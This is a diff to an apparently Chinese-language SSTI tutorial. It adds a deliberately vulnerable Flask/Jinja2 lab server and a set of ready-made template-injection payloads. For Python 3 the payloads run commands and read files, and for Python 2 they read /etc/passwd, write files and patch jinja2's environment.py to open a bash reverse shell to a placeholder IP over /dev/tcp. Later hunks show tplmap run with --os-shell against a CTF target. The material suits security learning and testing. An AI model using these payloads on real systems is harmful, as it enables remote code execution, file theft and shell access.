@@ -144,6 +144,68 @@ $output = $twig->render( $_GET['name'] , array("name" => $user.name) );
 
 **flask**
 
+使用 pycharm(老安装器了) 安装flask 我使用的是 python 3.7。这里直接附上服务器代码
+```py
+#python3.7
+#Flask version:0.12.2
+#Jinja2: 2.10
+from flask import Flask, request
+from jinja2 import Template
+app = Flask(__name__)
+@app.route("/")
+def index():
+    name = request.args.get('name', 'guest')
+    t = Template("Hello " + name)
+    return t.render()
+if __name__ == "__main__":
+    app.run();
+```
+
+可见这里直接将 name 获取到的值输入进 jinja2执行。可以利用这个点进行 SSTI 模板注入。
+
+测试如下：
+```
+?name=WDNMD.{{7*7}}
+```
+输出为:`Hello WDNMD.49`
+
+
+```
+ip?name=WDNMD.{{1+1}}
+```
+输出为:`Hello WDNMD.2`
+
+由此就有大佬找出了任意命令执行的方法了。
+
+python3
+```bash
+#命令执行：
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+
+#文件操作
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+```
+
+python2
+
+[注入变量执行命令](http://www.freebuf.com/articles/web/98928.html)
+
+```bash
+#读文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+#写文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
+```
+
+也可以通过写jinja2的environment.py执行命令。
+
+```bash
+#假设在/usr/lib/python2.7/dist-packages/jinja2/environment.py, 弹一个shell
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/usr/lib/python2.7/dist-packages/jinja2/environment.py').write("\nos.system('bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1')") }
+```
+
+
 
 
 ### PHP
@@ -154,6 +216,7 @@ $output = $twig->render( $_GET['name'] , array("name" => $user.name) );
 搭建使用 [TWIG v1.11.1版本](https://github.com/twigphp/Twig/releases/tag/v1.11.1)
 
 将下载下来的文件中的`lib`文件提取到PHP目录下
+
 ![](img/5.png)
 
 靶场搭建代码:
@@ -218,6 +281,7 @@ python ./tplmap.py -u 'http://4ed902ae-b677-45c3-a0c1-4c8a88af7f07.node3.buuoj.c
 ```bash
 python ./tplmap.py -u 'http://4ed902ae-b677-45c3-a0c1-4c8a88af7f07.node3.buuoj.cn/qaq?name=1*' --engine=Jinja2 --os-shell # 指定目标引擎
 ```
+
 ![](img/1.png)
 
 `ls ../`
